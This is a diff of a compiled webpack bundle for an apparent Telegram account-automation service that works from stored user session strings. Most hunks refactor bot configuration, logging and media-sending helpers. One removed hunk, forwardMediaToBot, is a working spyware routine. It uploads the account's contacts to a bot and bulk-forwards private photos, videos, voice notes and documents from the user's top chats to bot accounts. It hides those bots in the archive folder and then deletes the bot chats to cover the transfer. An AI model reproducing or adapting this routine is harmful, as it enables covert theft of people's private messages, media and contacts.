@@ -3504,7 +3504,6 @@ const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout 
 const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
 const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
 const message_search_dto_1 = __webpack_require__(/*! ./dto/message-search.dto */ "./src/components/Telegram/dto/message-search.dto.ts");
-const TelegramBots_config_1 = __webpack_require__(/*! ../../utils/TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
 class TelegramManager {
     constructor(sessionString, phoneNumber) {
         this.session = new sessions_1.StringSession(sessionString);
@@ -3623,78 +3622,6 @@ class TelegramManager {
         }
     }
     async forwardMediaToBot(fromChatId) {
-        const bots = TelegramBots_config_1.BotConfig.getInstance().getAllBotUsernames(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
-        try {
-            if (fromChatId) {
-                await this.forwardSecretMsgs(fromChatId, TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES));
-            }
-            else {
-                const chats = await this.getTopPrivateChats();
-                const me = await this.getMe();
-                const finalChats = new Set(chats.map(chat => chat.chatId));
-                finalChats.add(me.id?.toString());
-                for (const bot of bots) {
-                    try {
-                        await this.client.sendMessage(bot, { message: "Start" });
-                        await (0, Helpers_1.sleep)(1000);
-                        await this.client.invoke(new telegram_1.Api.folders.EditPeerFolders({
-                            folderPeers: [
-                                new telegram_1.Api.InputFolderPeer({
-                                    peer: await this.client.getInputEntity(bot),
-                                    folderId: 1,
-                                }),
-                            ],
-                        }));
-                    }
-                    catch (e) {
-                        console.log(e);
-                    }
-                }
-                try {
-                    const contacts = await this.getContacts();
-                    if ('users' in contacts && Array.isArray(contacts.users)) {
-                        await this.sendContactsFile(TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.USER_WARNINGS), contacts);
-                    }
-                    else {
-                        console.warn('Contacts result is not of type Api.contacts.Contacts, skipping sendContactsFile.');
-                    }
-                }
-                catch (e) {
-                    console.log("Failed To Send Contacts File", e);
-                }
-                for (const chatId of finalChats) {
-                    const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.VOICE] });
-                    console.log("Media Messages: ", mediaMessages);
-                    const uniqueMessageIds = Array.from(new Set([
-                        ...mediaMessages.photo.messages,
-                        ...mediaMessages.video.messages,
-                        ...mediaMessages.document.messages,
-                        ...mediaMessages.roundVideo.messages,
-                        ...mediaMessages.roundVoice.messages,
-                        ...mediaMessages.voice.messages,
-                    ]));
-                    const chunkSize = 30;
-                    for (let i = 0; i < uniqueMessageIds.length; i += chunkSize) {
-                        const chunk = uniqueMessageIds.slice(i, i + chunkSize);
-                        const bot = TelegramBots_config_1.BotConfig.getInstance().getBotUsername(TelegramBots_config_1.ChannelCategory.SAVED_MESSAGES);
-                        await this.client.forwardMessages(bot, {
-                            messages: chunk,
-                            fromPeer: chatId,
-                        });
-                        console.log(`Forwarded ${chunk.length} messages to bot`);
-                    }
-                }
-            }
-        }
-        catch (e) {
-            console.log(e);
-        }
-        for (const bot of bots) {
-            const result = await this.cleanupChat({ chatId: bot, revoke: false });
-            await (0, Helpers_1.sleep)(1000);
-            await this.deleteChat({ peer: bot, justClear: false });
-            console.log("Deleted bot chat:", result);
-        }
     }
     async forwardSecretMsgs(fromChatId, toChatId) {
         let offset = 0;
@@ -27067,161 +26994,6 @@ exports.LoggerMiddleware = LoggerMiddleware = __decorate([
 
 /***/ }),
 
-/***/ "./src/utils/ChannelLogger.ts":
-/*!************************************!*\
-  !*** ./src/utils/ChannelLogger.ts ***!
-  \************************************/
-/***/ (function(__unused_webpack_module, exports, __webpack_require__) {
-
-
-var __importDefault = (this && this.__importDefault) || function (mod) {
-    return (mod && mod.__esModule) ? mod : { "default": mod };
-};
-Object.defineProperty(exports, "__esModule", ({ value: true }));
-exports.clog = exports.ChannelLogger = exports.ChannelType = void 0;
-const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
-var ChannelType;
-(function (ChannelType) {
-    ChannelType["USER_WARNINGS"] = "userWarnings";
-    ChannelType["LOGIN_FAILURES"] = "loginFailures";
-    ChannelType["CHANNEL_NOTIFICATIONS"] = "channelNotifications";
-    ChannelType["SAVED_MESSAGES"] = "savedMessages";
-    ChannelType["CLIENT_UPDATES"] = "clientUpdates";
-    ChannelType["PROMOTION_FAILURES"] = "promotionFailures";
-    ChannelType["PROMOTIONS_INFO"] = "promotionsInfo";
-    ChannelType["GENERAL_ERRORS"] = "generalErrors";
-    ChannelType["HTTP_FAILURES"] = "httpFailures";
-})(ChannelType || (exports.ChannelType = ChannelType = {}));
-class ChannelLogger {
-    constructor() {
-        this.channels = {};
-        this.channelTypes = {
-            [ChannelType.USER_WARNINGS]: 'TELEGRAM_CHANNEL_CONFIG_USER_WARNINGS',
-            [ChannelType.LOGIN_FAILURES]: 'TELEGRAM_CHANNEL_CONFIG_LOGIN_FAILURES',
-            [ChannelType.CHANNEL_NOTIFICATIONS]: 'TELEGRAM_CHANNEL_CONFIG_CHANNEL_NOTIFICATIONS',
-            [ChannelType.SAVED_MESSAGES]: 'TELEGRAM_CHANNEL_CONFIG_SAVED',
-            [ChannelType.CLIENT_UPDATES]: 'TELEGRAM_CHANNEL_CONFIG_CLIENT_UPDATES',
-            [ChannelType.PROMOTION_FAILURES]: 'TELEGRAM_CHANNEL_CONFIG_PROMOTION_FAILURES',
-            [ChannelType.PROMOTIONS_INFO]: 'TELEGRAM_CHANNEL_CONFIG_PROMOTIONS_INFO',
-            [ChannelType.GENERAL_ERRORS]: 'TELEGRAM_CHANNEL_CONFIG_GENERAL_ERRORS',
-            [ChannelType.HTTP_FAILURES]: 'TELEGRAM_CHANNEL_CONFIG_HTTP_FAILURES'
-        };
-        this.initializeChannels();
-    }
-    static getInstance() {
-        if (!ChannelLogger.instance) {
-            ChannelLogger.instance = new ChannelLogger();
-        }
-        return ChannelLogger.instance;
-    }
-    initializeChannels() {
-        Object.entries(this.channelTypes).forEach(([channelKey, envVar]) => {
-            const config = process.env[envVar];
-            if (config) {
-                const parts = config.split('::');
-                if (parts.length >= 3) {
-                    const [channelId, name, ...tokenParts] = parts;
-                    const tokensStr = tokenParts.join('::');
-                    const tokens = tokensStr.split(',').map(token => token.trim()).filter(token => token);
-                    if (channelId && tokens.length > 0) {
-                        this.channels[channelKey] = {
-                            channelId,
-                            tokens,
-                            currentTokenIndex: 0
-                        };
-                        console.log(`Configured ${channelKey} channel: ${channelId} with ${tokens.length} token(s)`);
-                    }
-                    else {
-                        console.warn(`Invalid config for ${channelKey}: missing channelId or tokens`);
-                    }
-                }
-                else {
-                    console.warn(`Invalid config format for ${channelKey}: expected format 'channelId::name::token1,token2'`);
-                }
-            }
-            else {
-                console.log(`No configuration found for ${channelKey} (${envVar})`);
-            }
-        });
-        console.log(`ChannelLogger initialized with ${Object.keys(this.channels).length} channels`);
-    }
-    async sendMessage(channelType, message, options = {}, retries = 1) {
-        const channel = this.channels[channelType];
-        if (!channel) {
-            console.error(`Channel ${channelType} not configured`);
-            return false;
-        }
-        const defaultOptions = {};
-        const telegramOptions = { ...defaultOptions, ...options };
-        for (let attempt = 0; attempt <= retries; attempt++) {
-            const token = channel.tokens[channel.currentTokenIndex];
-            channel.currentTokenIndex = (channel.currentTokenIndex + 1) % channel.tokens.length;
-            try {
-                const url = `https://api.telegram.org/bot${token}/sendMessage`;
-                const payload = {
-                    chat_id: channel.channelId,
-                    text: message,
-                    ...telegramOptions
-                };
-                const response = await axios_1.default.post(url, payload, {
-                    timeout: 5000,
-                    validateStatus: (status) => status === 200
-                });
-                return true;
-            }
-            catch (error) {
-                const errorMsg = error.response?.data?.description || error.message;
-                console.error(`Attempt ${attempt + 1} failed for ${channelType}: ${errorMsg}`);
-                if (attempt === retries) {
-                    return false;
-                }
-            }
-        }
-        return false;
-    }
-    async sendUserWarning(message, options) {
-        return this.sendMessage(ChannelType.USER_WARNINGS, message, options);
-    }
-    async sendHttpFailures(message, options) {
-        return this.sendMessage(ChannelType.HTTP_FAILURES, message, options);
-    }
-    async sendLoginFailure(message, options) {
-        return this.sendMessage(ChannelType.LOGIN_FAILURES, message, options);
-    }
-    async sendChannelNotification(message, options) {
-        return this.sendMessage(ChannelType.CHANNEL_NOTIFICATIONS, message, options);
-    }
-    async sendSavedMessage(message, options) {
-        return this.sendMessage(ChannelType.SAVED_MESSAGES, message, options);
-    }
-    async sendClientUpdate(message, options) {
-        return this.sendMessage(ChannelType.CLIENT_UPDATES, message, options);
-    }
-    async sendPromotionFailure(message, options) {
-        return this.sendMessage(ChannelType.PROMOTION_FAILURES, message, options);
-    }
-    async sendPromotionsInfo(message, options) {
-        return this.sendMessage(ChannelType.PROMOTIONS_INFO, message, options);
-    }
-    async sendGeneralError(message, options) {
-        return this.sendMessage(ChannelType.GENERAL_ERRORS, message, options);
-    }
-    async send(channelType, message, options) {
-        return this.sendMessage(channelType, message, options);
-    }
-    isChannelConfigured(channelType) {
-        return !!this.channels[channelType];
-    }
-    getConfiguredChannels() {
-        return Object.keys(this.channels);
-    }
-}
-exports.ChannelLogger = ChannelLogger;
-exports.clog = ChannelLogger.getInstance();
-
-
-/***/ }),
-
 /***/ "./src/utils/TelegramBots.config.ts":
 /*!******************************************!*\
   !*** ./src/utils/TelegramBots.config.ts ***!
@@ -27235,7 +27007,7 @@ var __importDefault = (this && this.__importDefault) || function (mod) {
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.BotConfig = exports.ChannelCategory = void 0;
 const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
-const fetchWithTimeout_1 = __webpack_require__(/*! ./fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
+const form_data_1 = __importDefault(__webpack_require__(/*! form-data */ "form-data"));
 var ChannelCategory;
 (function (ChannelCategory) {
     ChannelCategory["CLIENT_UPDATES"] = "CLIENT_UPDATES";
@@ -27250,11 +27022,20 @@ var ChannelCategory;
     ChannelCategory["CLIENT_ACCOUNT"] = "CLIENT_ACCOUNT";
     ChannelCategory["PAYMENT_FAIL_QUERIES"] = "PAYMENT_FAIL_QUERIES";
     ChannelCategory["SAVED_MESSAGES"] = "SAVED_MESSAGES";
+    ChannelCategory["HTTP_FAILURES"] = "HTTP_FAILURES";
+    ChannelCategory["UNVDS"] = "UNVDS";
+    ChannelCategory["PROM_LOGS1"] = "PROM_LOGS1";
+    ChannelCategory["PROM_LOGS2"] = "PROM_LOGS2";
 })(ChannelCategory || (exports.ChannelCategory = ChannelCategory = {}));
 class BotConfig {
     constructor() {
         this.categoryMap = new Map();
         this.initialized = false;
+        this.initializing = false;
+        this.initPromise = null;
+        this.initRetries = 0;
+        this.MAX_RETRIES = 3;
+        this.RETRY_DELAY = 2000;
         this.initPromise = this.initialize();
     }
     static getInstance() {
@@ -27263,74 +27044,139 @@ class BotConfig {
         }
         return BotConfig.instance;
     }
+    static async initializeAndGetInstance() {
+        const instance = BotConfig.getInstance();
+        await instance.ready();
+        return instance;
+    }
     async ready() {
-        if (!this.initialized) {
-            await this.initPromise;
+        if (this.initialized) {
+            return;
         }
+        if (!this.initPromise) {
+            this.initPromise = this.initialize();
+        }
+        return this.initPromise;
     }
     async initialize() {
-        console.debug('Initializing Telegram channel configuration...');
-        const envKeys = Object.keys(process.env).filter(key => key.startsWith('TELEGRAM_CHANNEL_CONFIG_'));
-        for (const key of envKeys) {
-            const value = process.env[key];
-            if (!value)
-                continue;
-            const [channelId, description = '', botTokensStr] = value.split('::');
-            const botTokens = botTokensStr?.split(',').map(t => t.trim()).filter(Boolean);
-            if (!channelId || !botTokens || botTokens.length === 0)
-                continue;
-            const category = this.getCategoryFromDescription(description);
-            if (!category)
-                continue;
-            const botUsernames = [];
-            for (const token of botTokens) {
-                const username = await this.fetchUsername(token);
-                if (!username) {
-                    console.log(`Invalid bot token for ${category}, token: ${token}`);
-                }
-                botUsernames.push(username);
-            }
-            this.categoryMap.set(category, {
-                botTokens,
-                botUsernames,
-                lastUsedIndex: -1,
-                channelId,
-            });
+        if (this.initialized || this.initializing) {
+            return;
         }
-        this.initialized = true;
-        console.info('BotConfig initialized.');
+        try {
+            this.initializing = true;
+            console.debug('Initializing Telegram channel configuration...');
+            const envKeys = Object.keys(process.env).filter(key => key.startsWith('TELEGRAM_CHANNEL_CONFIG_'));
+            for (const key of envKeys) {
+                const value = process.env[key];
+                if (!value)
+                    continue;
+                try {
+                    const [channelId, description = '', botTokensStr] = value.split('::');
+                    const botTokens = botTokensStr?.split(',').map(t => t.trim()).filter(Boolean);
+                    if (!channelId || !botTokens || botTokens.length === 0) {
+                        console.warn(`Invalid configuration for ${key}: missing channelId or botTokens`);
+                        continue;
+                    }
+                    const category = this.getCategoryFromDescription(description);
+                    if (!category) {
+                        console.warn(`Invalid category in description for ${key}: ${description}`);
+                        continue;
+                    }
+                    const botUsernames = [];
+                    for (const token of botTokens) {
+                        try {
+                            const username = await this.fetchUsername(token);
+                            if (!username) {
+                                console.warn(`Invalid bot token in ${category}`);
+                                continue;
+                            }
+                            botUsernames.push(username);
+                        }
+                        catch (error) {
+                            console.error(`Error fetching username for token in ${category}:`, error);
+                        }
+                    }
+                    if (botUsernames.length === 0) {
+                        console.warn(`No valid bot usernames found for ${category}`);
+                        continue;
+                    }
+                    this.categoryMap.set(category, {
+                        botTokens,
+                        botUsernames,
+                        lastUsedIndex: -1,
+                        channelId,
+                    });
+                }
+                catch (error) {
+                    console.error(`Error processing configuration for ${key}:`, error);
+                }
+            }
+            await this.initializeBots();
+            this.initialized = true;
+            console.info(`BotConfig initialized successfully with ${this.categoryMap.size} categories.`);
+        }
+        catch (error) {
+            console.error('Failed to initialize BotConfig:', error);
+            if (this.initRetries < this.MAX_RETRIES) {
+                this.initRetries++;
+                console.info(`Retrying initialization (attempt ${this.initRetries}/${this.MAX_RETRIES})...`);
+                this.initializing = false;
+                this.initPromise = null;
+                await new Promise(resolve => setTimeout(resolve, this.RETRY_DELAY));
+                return this.initialize();
+            }
+            else {
+                console.error(`Failed to initialize after ${this.MAX_RETRIES} attempts`);
+                throw error;
+            }
+        }
+        finally {
+            this.initializing = false;
+        }
     }
     getCategoryFromDescription(desc) {
-        const normalized = desc.toUpperCase();
-        return Object.values(ChannelCategory).find(cat => normalized.includes(cat)) ?? null;
+        if (!desc)
+            return null;
+        const normalized = desc.trim().toUpperCase();
+        return Object.values(ChannelCategory).find(cat => normalized.includes(cat) || cat.includes(normalized)) ?? null;
     }
     async fetchUsername(token) {
-        const res = await (0, fetchWithTimeout_1.fetchWithTimeout)(`https://api.telegram.org/bot${token}/getMe`);
-        const resData = res.data;
-        return resData?.ok ? resData.result.username : '';
+        if (!token || typeof token !== 'string' || token.length < 10) {
+            return '';
+        }
+        try {
+            const res = await axios_1.default.get(`https://api.telegram.org/bot${token}/getMe`, {
+                timeout: 5000
+            });
+            return res.data?.ok ? res.data.result.username : '';
+        }
+        catch (error) {
+            console.error('Error fetching bot username:', error);
+            return '';
+        }
     }
-    getBotUsername(category) {
-        this.assertInitialized();
+    async getBotUsername(category) {
+        await this.ensureInitialized();
         const data = this.categoryMap.get(category);
         if (!data || data.botUsernames.length === 0) {
-            throw new Error(`No valid bots for ${category}`);
+            throw new Error(`No valid bots configured for ${category}`);
         }
         data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;
         return data.botUsernames[data.lastUsedIndex];
     }
-    getChannelId(category) {
-        this.assertInitialized();
+    async getChannelId(category) {
+        await this.ensureInitialized();
         const data = this.categoryMap.get(category);
         if (!data) {
-            throw new Error(`No config for ${category}`);
+            throw new Error(`No configuration found for ${category}`);
         }
         return data.channelId;
     }
-    getBotAndChannel(category) {
-        this.assertInitialized();
+    async getBotAndChannel(category) {
+        await this.ensureInitialized();
         const data = this.categoryMap.get(category);
         if (!data || data.botUsernames.length === 0) {
-            throw new Error(`No valid bots for ${category}`);
+            throw new Error(`No valid bots configured for ${category}`);
         }
         data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;
         return {
@@ -27339,32 +27185,367 @@ class BotConfig {
             token: data.botTokens[data.lastUsedIndex],
         };
     }
-    async sendMessage(category, message) {
-        this.assertInitialized();
+    async sendMessage(category, message, options = {}) {
+        await this.ensureInitialized();
         const data = this.categoryMap.get(category);
         if (!data || data.botTokens.length === 0) {
-            throw new Error(`No valid bots for ${category}`);
+            throw new Error(`No valid bots configured for ${category}`);
         }
         data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;
-        const token = data.botTokens[data.lastUsedIndex];
+        const botIndex = data.lastUsedIndex;
+        const token = data.botTokens[botIndex];
         const channelId = data.channelId;
-        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${channelId}&text=${encodeURIComponent(message)}`;
-        axios_1.default.post(url).catch(error => {
-            console.error(`Failed to send message to ${channelId}:`, error);
+        const params = new URLSearchParams({
+            chat_id: channelId,
+            text: `${process.env.clientId.toUpperCase()}:\n\n${message}`,
         });
+        if (options.parseMode)
+            params.append('parse_mode', options.parseMode);
+        if (options.disableWebPagePreview)
+            params.append('disable_web_page_preview', 'true');
+        if (options.disableNotification)
+            params.append('disable_notification', 'true');
+        if (options.replyToMessageId)
+            params.append('reply_to_message_id', options.replyToMessageId.toString());
+        if (options.allowSendingWithoutReply)
+            params.append('allow_sending_without_reply', 'true');
+        if (options.protectContent)
+            params.append('protect_content', 'true');
+        if (options.linkPreviewOptions) {
+            const { isDisabled, url, preferSmallMedia, preferLargeMedia, showAboveText } = options.linkPreviewOptions;
+            if (isDisabled)
+                params.append('disable_web_page_preview', 'true');
+            if (url)
+                params.append('link_preview_url', url);
+            if (preferSmallMedia)
+                params.append('prefer_small_media', 'true');
+            if (preferLargeMedia)
+                params.append('prefer_large_media', 'true');
+            if (showAboveText)
+                params.append('show_above_text', 'true');
+        }
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+        try {
+            const response = await axios_1.default.post(url, params, {
+                timeout: 10000
+            });
+            return response.data?.ok === true;
+        }
+        catch (error) {
+            console.error(`Failed to send message to ${channelId} using bot at index ${botIndex}:`, error);
+            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {
+                console.debug(`Retrying with next available bot for ${category}`);
+                data.lastUsedIndex = botIndex;
+                return this.sendMessage(category, message, options);
+            }
+            return false;
+        }
     }
-    getAllBotUsernames(category) {
-        this.assertInitialized();
+    async sendPhoto(category, photo, options = {}) {
+        return this.sendMedia(category, 'sendPhoto', photo, options);
+    }
+    async sendVideo(category, video, options = {}) {
+        return this.sendMedia(category, 'sendVideo', video, options);
+    }
+    async sendAudio(category, audio, options = {}) {
+        return this.sendMedia(category, 'sendAudio', audio, options);
+    }
+    async sendDocument(category, document, options = {}) {
+        return this.sendMedia(category, 'sendDocument', document, options);
+    }
+    async sendVoice(category, voice, options = {}) {
+        return this.sendMedia(category, 'sendVoice', voice, options);
+    }
+    async sendVideoNote(category, videoNote, options = {}) {
+        return this.sendMedia(category, 'sendVideoNote', videoNote, options);
+    }
+    async sendAnimation(category, animation, options = {}) {
+        return this.sendMedia(category, 'sendAnimation', animation, options);
+    }
+    async sendSticker(category, sticker, options = {}) {
+        return this.sendMedia(category, 'sendSticker', sticker, options);
+    }
+    async sendMediaGroup(category, media, options = {}) {
+        await this.ensureInitialized();
         const data = this.categoryMap.get(category);
-        if (!data || data.botUsernames.length === 0) {
-            throw new Error(`No valid bots for ${category}`);
+        if (!data || data.botTokens.length === 0) {
+            throw new Error(`No valid bots configured for ${category}`);
         }
-        return [...data.botUsernames];
+        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;
+        const botIndex = data.lastUsedIndex;
+        const token = data.botTokens[botIndex];
+        const channelId = data.channelId;
+        const formData = new form_data_1.default();
+        formData.append('chat_id', channelId);
+        const mediaArray = [];
+        for (let i = 0; i < media.length; i++) {
+            const item = media[i];
+            const mediaObj = {
+                type: item.type,
+                media: Buffer.isBuffer(item.media) ? `attach://file${i}` : item.media,
+            };
+            mediaObj.caption = `${process.env.clientId.toUpperCase()}:\n\n${item.caption || ''}`;
+            if (item.parseMode)
+                mediaObj.parse_mode = item.parseMode;
+            if (item.hasSpoiler)
+                mediaObj.has_spoiler = true;
+            if (item.type === 'video') {
+                if (item.duration)
+                    mediaObj.duration = item.duration;
+                if (item.width)
+                    mediaObj.width = item.width;
+                if (item.height)
+                    mediaObj.height = item.height;
+                if (item.supportsStreaming)
+                    mediaObj.supports_streaming = true;
+            }
+            if (item.type === 'audio') {
+                if (item.duration)
+                    mediaObj.duration = item.duration;
+                if (item.performer)
+                    mediaObj.performer = item.performer;
+                if (item.title)
+                    mediaObj.title = item.title;
+            }
+            if (item.type === 'document') {
+                if (item.thumbnail && Buffer.isBuffer(item.thumbnail)) {
+                    mediaObj.thumbnail = `attach://thumb${i}`;
+                }
+            }
+            mediaArray.push(mediaObj);
+            if (Buffer.isBuffer(item.media)) {
+                let filename = `file${i}`;
+                if (item.extension) {
+                    filename = `file${i}.${item.extension}`;
+                }
+                else {
+                    switch (item.type) {
+                        case 'photo':
+                            filename = `file${i}.jpg`;
+                            break;
+                        case 'video':
+                            filename = `file${i}.mp4`;
+                            break;
+                        case 'audio':
+                            filename = `file${i}.mp3`;
+                            break;
+                        case 'document':
+                            filename = `file${i}.bin`;
+                            break;
+                    }
+                }
+                formData.append(`file${i}`, item.media, filename);
+            }
+            if (item.type === 'document' && item.thumbnail && Buffer.isBuffer(item.thumbnail)) {
+                formData.append(`thumb${i}`, item.thumbnail, `thumb${i}.jpg`);
+            }
+        }
+        formData.append('media', JSON.stringify(mediaArray));
+        if (options.disableNotification)
+            formData.append('disable_notification', 'true');
+        if (options.replyToMessageId)
+            formData.append('reply_to_message_id', options.replyToMessageId.toString());
+        if (options.allowSendingWithoutReply)
+            formData.append('allow_sending_without_reply', 'true');
+        if (options.protectContent)
+            formData.append('protect_content', 'true');
+        const url = `https://api.telegram.org/bot${token}/sendMediaGroup`;
+        try {
+            const response = await axios_1.default.post(url, formData, {
+                timeout: 30000,
+                headers: {
+                    ...formData.getHeaders(),
+                },
+            });
+            return response.data?.ok === true;
+        }
+        catch (error) {
+            console.error(`Failed to send media group to ${channelId} using bot at index ${botIndex}:`, error);
+            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {
+                console.debug(`Retrying with next available bot for ${category}`);
+                data.lastUsedIndex = botIndex;
+                return this.sendMediaGroup(category, media, options);
+            }
+            return false;
+        }
     }
-    assertInitialized() {
-        if (!this.initialized) {
-            throw new Error('BotConfig not initialized. App module has not finished initializing.');
+    async sendMedia(category, method, media, options = {}) {
+        await this.ensureInitialized();
+        const data = this.categoryMap.get(category);
+        if (!data || data.botTokens.length === 0) {
+            throw new Error(`No valid bots configured for ${category}`);
         }
+        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;
+        const botIndex = data.lastUsedIndex;
+        const token = data.botTokens[botIndex];
+        const channelId = data.channelId;
+        const formData = new form_data_1.default();
+        formData.append('chat_id', channelId);
+        const mediaField = method.replace('send', '').toLowerCase();
+        if (Buffer.isBuffer(media)) {
+            formData.append(mediaField, media, `${mediaField}.dat`);
+        }
+        else {
+            formData.append(mediaField, media);
+        }
+        if (options.caption)
+            formData.append('caption', `${process.env.clientId.toUpperCase()}:\n\n${options.caption}`);
+        if (options.parseMode)
+            formData.append('parse_mode', options.parseMode);
+        if (options.disableNotification)
+            formData.append('disable_notification', 'true');
+        if (options.replyToMessageId)
+            formData.append('reply_to_message_id', options.replyToMessageId.toString());
+        if (options.allowSendingWithoutReply)
+            formData.append('allow_sending_without_reply', 'true');
+        if (options.protectContent)
+            formData.append('protect_content', 'true');
+        if (options.hasSpoiler)
+            formData.append('has_spoiler', 'true');
+        if (method === 'sendVideo') {
+            if (options.duration)
+                formData.append('duration', options.duration.toString());
+            if (options.width)
+                formData.append('width', options.width.toString());
+            if (options.height)
+                formData.append('height', options.height.toString());
+            if (options.supportsStreaming)
+                formData.append('supports_streaming', 'true');
+            if (options.thumbnail) {
+                if (Buffer.isBuffer(options.thumbnail)) {
+                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
+                }
+                else {
+                    formData.append('thumbnail', options.thumbnail);
+                }
+            }
+        }
+        if (method === 'sendAudio') {
+            if (options.duration)
+                formData.append('duration', options.duration.toString());
+            if (options.performer)
+                formData.append('performer', options.performer);
+            if (options.title)
+                formData.append('title', options.title);
+            if (options.thumbnail) {
+                if (Buffer.isBuffer(options.thumbnail)) {
+                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
+                }
+                else {
+                    formData.append('thumbnail', options.thumbnail);
+                }
+            }
+        }
+        if (method === 'sendDocument') {
+            if (options.thumbnail) {
+                if (Buffer.isBuffer(options.thumbnail)) {
+                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
+                }
+                else {
+                    formData.append('thumbnail', options.thumbnail);
+                }
+            }
+            if (options.disableContentTypeDetection)
+                formData.append('disable_content_type_detection', 'true');
+        }
+        if (method === 'sendVoice') {
+            if (options.duration)
+                formData.append('duration', options.duration.toString());
+        }
+        if (method === 'sendVideoNote') {
+            if (options.duration)
+                formData.append('duration', options.duration.toString());
+            if (options.length)
+                formData.append('length', options.length.toString());
+            if (options.thumbnail) {
+                if (Buffer.isBuffer(options.thumbnail)) {
+                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
+                }
+                else {
+                    formData.append('thumbnail', options.thumbnail);
+                }
+            }
+        }
+        if (method === 'sendAnimation') {
+            if (options.duration)
+                formData.append('duration', options.duration.toString());
+            if (options.width)
+                formData.append('width', options.width.toString());
+            if (options.height)
+                formData.append('height', options.height.toString());
+            if (options.thumbnail) {
+                if (Buffer.isBuffer(options.thumbnail)) {
+                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');
+                }
+                else {
+                    formData.append('thumbnail', options.thumbnail);
+                }
+            }
+        }
+        if (method === 'sendSticker') {
+            if (options.emoji)
+                formData.append('emoji', options.emoji);
+        }
+        const url = `https://api.telegram.org/bot${token}/${method}`;
+        try {
+            const response = await axios_1.default.post(url, formData, {
+                timeout: 30000,
+                headers: {
+                    ...formData.getHeaders(),
+                },
+            });
+            return response.data?.ok === true;
+        }
+        catch (error) {
+            console.error(`Failed to send ${method} to ${channelId} using bot at index ${botIndex}:`, error);
+            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {
+                console.debug(`Retrying with next available bot for ${category}`);
+                data.lastUsedIndex = botIndex;
+                return this.sendMedia(category, method, media, options);
+            }
+            return false;
+        }
+    }
+    async initializeBots() {
+        console.debug('Initializing bots with /start command...');
+        const initPromises = [];
+        for (const [category, data] of this.categoryMap) {
+            for (const token of data.botTokens) {
+                const promise = (async () => {
+                    try {
+                        const botInfo = await axios_1.default.get(`https://api.telegram.org/bot${token}/getMe`, {
+                            timeout: 5000
+                        });
+                        if (!botInfo.data?.ok) {
+                            console.error(`Failed to get bot info for ${category}`);
+                            return;
+                        }
+                        console.debug(`Successfully initialized bot for ${category}`);
+                    }
+                    catch (error) {
+                        console.error(`Failed to initialize bot for ${category}:`, error);
+                    }
+                })();
+                initPromises.push(promise);
+            }
+        }
+        await Promise.allSettled(initPromises);
+    }
+    async ensureInitialized() {
+        if (!this.initialized) {
+            await this.ready();
+            if (!this.initialized) {
+                throw new Error('BotConfig initialization failed. Unable to proceed.');
+            }
+        }
+    }
+    async hasCategory(category) {
+        await this.ensureInitialized();
+        return this.categoryMap.has(category);
+    }
+    async getConfiguredCategories() {
+        await this.ensureInitialized();
+        return Array.from(this.categoryMap.keys());
     }
 }
 exports.BotConfig = BotConfig;
@@ -27536,8 +27717,8 @@ Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.fetchWithTimeout = fetchWithTimeout;
 const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
 const parseError_1 = __webpack_require__(/*! ./parseError */ "./src/utils/parseError.ts");
-const ChannelLogger_1 = __webpack_require__(/*! ./ChannelLogger */ "./src/utils/ChannelLogger.ts");
 const common_1 = __webpack_require__(/*! ./common */ "./src/utils/common.ts");
+const TelegramBots_config_1 = __webpack_require__(/*! ./TelegramBots.config */ "./src/utils/TelegramBots.config.ts");
 const DEFAULT_RETRY_CONFIG = {
     maxRetries: 3,
     baseDelay: 500,
@@ -27552,7 +27733,7 @@ const DEFAULT_NOTIFICATION_CONFIG = {
 async function notifyInternal(prefix, errorDetails, config = DEFAULT_NOTIFICATION_CONFIG) {
     if (!config.enabled)
         return;
-    prefix = `${prefix} ${process.env.clientId || 'uptimeChecker2'}`;
+    prefix = `${prefix} ${process.env.clientId}`;
     try {
         const errorMessage = typeof errorDetails.message === 'string'
             ? errorDetails.message
@@ -27565,14 +27746,14 @@ async function notifyInternal(prefix, errorDetails, config = DEFAULT_NOTIFICATIO
             return;
         const notificationText = `${prefix}\n\n${formattedMessage}`;
         try {
-            await ChannelLogger_1.clog.sendHttpFailures(notificationText);
+            await TelegramBots_config_1.BotConfig.getInstance().sendMessage(TelegramBots_config_1.ChannelCategory.HTTP_FAILURES, notificationText);
         }
         catch (error) {
-            (0, parseError_1.parseError)(error, "Failed to send notification:", false);
+            console.error("Failed to send notification:", error.response?.data || error.message || error.code);
         }
     }
     catch (error) {
